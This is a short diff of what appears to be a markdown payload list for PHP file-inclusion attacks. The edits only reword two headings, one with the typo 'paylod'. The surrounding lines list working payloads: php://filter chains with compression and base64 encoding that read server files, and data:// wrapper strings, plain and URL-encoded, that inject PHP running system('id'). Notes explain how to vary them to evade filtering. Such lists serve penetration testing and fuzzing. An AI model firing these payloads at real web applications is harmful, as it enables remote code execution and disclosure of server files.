@@ -37,7 +37,7 @@ php://filter/bzip2.compress/resource=*
 php://filter/zlib.deflate|convert.base64-encode/resource=*
 php://filter/bzip2.compress|convert.base64-encode/resource=*
 ```
-**variations derived from:**
+- **payload variations derived from:**
 1. usage of different PHP filters (https://www.php.net/manual/en/filters.php)
 2. chaining filters using `|`
 3. using `php://filter/read=` instead of `php://filter`
@@ -51,7 +51,7 @@ data:text/plain,%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
 data%3Atext%2Fplain%2C%3C%3Fphp%20system%28%27id%27%29%3B%20%3F%3E
 data://text/plain,<?php%20eval(\"system('id');\");%20?>
 ```
-**variations derived from:**
+- **paylod variations derived from:**
 1. using both base64 (`data://text/plain;base64`) and plain text input (`data://text/plain`, `data:text/plain`)
 2. url encoding variations:
 - encoding special chars, different parts of the payload, and encoding an already encoded (first layer with non special char) payload
